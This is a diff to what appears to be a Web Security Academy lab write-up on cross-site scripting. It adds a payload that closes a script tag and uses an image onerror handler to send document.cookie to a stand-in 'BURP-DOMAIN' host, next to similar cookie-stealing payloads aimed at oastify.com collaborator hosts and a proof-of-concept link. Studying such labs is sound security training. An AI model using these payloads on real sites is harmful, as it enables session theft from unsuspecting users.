@@ -15,6 +15,12 @@ or
 \'</ScRiPt><img src=x onerror="window.location=`http://d7lk443a3qapex6cepn5sp8lico2cr.oastify.com/?x=`+document.cookie">
 ```
 
+or 
+
+```html
+</ScRiPt ><ScRiPt ><img src=a onerror="window.location=`http://BURP-DOMAIN/?cookie=`+document.cookie"></ScRiPt >
+```
+
 POC
 ```
 <script>document.location="https://0a0f009c03cfc7b6c0f9a82500460045.web-security-academy.net/?lookup=\'</ScRiPt ><img src=a onerror="window.location=`http://66aelmwr5xbnmfugwm5586nkrbx5lu.oastify.com/?cookie=`+document.cookie">"</script>
